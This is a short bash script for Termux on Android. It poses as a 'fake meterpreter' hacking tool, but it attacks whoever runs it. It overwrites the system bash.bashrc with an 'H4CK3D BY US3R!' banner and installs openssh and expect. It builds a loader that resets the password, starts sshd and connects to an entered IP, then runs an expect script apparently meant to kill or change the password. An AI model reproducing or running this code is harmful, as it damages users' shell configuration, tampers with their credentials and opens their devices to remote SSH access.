#!bin/bash
user=$(whoami)
ifconfig
echo "$user"
read -p "fakemeterpreter> " ip
echo -e "sshd\n" > "/data/data/com.termux/files/usr/etc/bash.bashrc"
echo -e 'cd /data/data/com.termux/files/home/drhack ; bash rbanner.sh ; echo "\033[7;49;93m H4CK3D BY US3R! \033[m\n"' > '/data/data/com.termux/files/usr/etc/bash.bashrc'
apt-get install openssh -y
apt-get install termux-auth -y
apt-get install expect -y
apt-get install sed -y
touch sshloader.sh
echo -e "passwd \n sshd \n ssh $user@$ip -p 8022 \n" >> sshloader.sh
chmod +x *
expect killpswd.exp
